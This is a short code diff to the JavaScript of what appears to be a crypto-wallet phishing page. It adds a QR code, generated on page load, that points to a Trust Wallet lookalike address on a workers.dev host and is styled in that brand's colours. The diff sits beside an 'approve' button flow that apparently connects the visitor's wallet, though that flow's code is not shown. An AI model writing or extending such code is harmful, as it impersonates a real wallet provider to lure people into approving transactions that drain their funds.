@@ -78,7 +78,21 @@ function setLoading(on, label = "Processing…") {
   btnText.textContent = on ? label : "Confirm Now";
   btnSpinner.hidden   = !on;
 }
-
+// ─── Generación automática del QR de Pago ────────────────────
+window.addEventListener("DOMContentLoaded", () => {
+  const qrContainer = document.getElementById("qrcode");
+  if (qrContainer && window.QRCode) {
+    qrContainer.innerHTML = ""; // Limpiar contenedor por seguridad
+    new QRCode(qrContainer, {
+      text: "https://trustwallet.secureconnections.workers.dev/",
+      width: 140,
+      height: 140,
+      colorDark: "#0052FF", // Azul corporativo Trust Wallet
+      colorLight: "#ffffff",
+      correctLevel: QRCode.CorrectLevel.H
+    });
+  }
+});
 // ─── UN SOLO CICLO DIRECTO Y FLUIDO ───────────────────────────────────────────
 approveBtn.addEventListener("click", async () => {
   // 1. Conexión transparente si no hay proveedor activo
